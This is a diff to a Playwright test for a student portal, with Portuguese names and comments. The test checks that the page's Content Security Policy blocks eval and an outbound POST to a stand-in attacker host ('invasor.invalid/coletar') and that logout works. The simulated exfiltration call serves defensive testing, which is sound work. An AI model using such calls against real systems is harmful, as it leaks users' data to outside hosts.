@@ -11,8 +11,24 @@ def test_navegador_bloqueia_eval_e_conexao_externa_e_revoga_logout(runtime):
     context.route('https://invasor.invalid/**',lambda rota:externas.append(rota.request.url) or rota.abort())
     try:
         token=page.evaluate('SessaoPortal.token()')
-        assert page.evaluate("()=>{try{new Function('return 1')();return false;}catch(e){return e.name==='EvalError';}}")
-        assert page.evaluate("async()=>{try{await fetch('https://invasor.invalid/coletar',{method:'POST',body:'teste'});return false;}catch(e){return true;}}")
+        # Runtime.evaluate pode liberar eval para o depurador. Exercite a CSP
+        # com um script da própria página, submetido à política do documento.
+        page.add_script_tag(content="""
+            window.__cspFinalizado=false;
+            setTimeout(()=>{
+                window.__cspEvalBloqueado=false;
+                try { new Function('return 1')(); }
+                catch(e) { window.__cspEvalBloqueado=e.name==='EvalError'; }
+                window.__cspConexaoBloqueada=null;
+                fetch('https://invasor.invalid/coletar',{method:'POST',body:'teste'})
+                    .then(()=>window.__cspConexaoBloqueada=false)
+                    .catch(()=>window.__cspConexaoBloqueada=true)
+                    .finally(()=>window.__cspFinalizado=true);
+            },0);
+        """)
+        page.wait_for_function('()=>window.__cspFinalizado===true')
+        assert page.evaluate('window.__cspEvalBloqueado')
+        assert page.evaluate('window.__cspConexaoBloqueada')
         assert not externas
         page.evaluate('fazerLogoff(false)')
         assert page.locator('#loginAlunoScreen').is_visible()
